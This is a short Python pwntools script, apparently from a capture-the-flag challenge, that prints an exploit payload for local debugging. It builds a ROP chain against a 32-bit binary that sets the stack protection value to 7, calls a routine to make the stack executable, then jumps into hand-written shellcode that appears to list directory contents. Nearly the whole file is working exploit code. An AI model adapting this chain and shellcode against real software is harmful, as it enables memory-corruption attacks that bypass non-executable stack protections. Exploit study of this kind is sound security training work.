# file nay dung de in ra cai payload = rop + shellcode1 de debug local

from pwn import *

padding = "a"*0xc

libc_stack_end = 0x080e9fc8
stack_prot = 0x080e9fec
stack_executable = 0x0809a080


# 0x080b8536 : pop eax ; ret
pop_eax_ret = 0x080b8536
# 0x0805462b : mov dword ptr [edx], eax ; ret
mov_ret = 0x0805462b
# 0x0806ec8b : pop edx ; ret
pop_edx_ret = 0x0806ec8b
# 0x080b8546 : push esp ; ret
push_esp_ret = 0x080b8546

shellcode = "\xB8\x05\x00\x00\x00\x6A\x2E\x89\xE3\xB9\x00\x00\x20\x00\xBA\x00\x04\x00\x00\xCD\x80\x89\xC3\xB8\x8D\x00\x00\x00\xB9\x00\xA0\x0E\x08\xBA\x14\x00\x00\x00\xCD\x80"
payload = padding + p32(pop_eax_ret) + p32(7)
payload += p32(pop_edx_ret) + p32(stack_prot)
payload += p32(mov_ret)
payload += p32(pop_eax_ret) + p32(libc_stack_end)
payload += p32(stack_executable)
payload += p32(push_esp_ret) + shellcode

print payload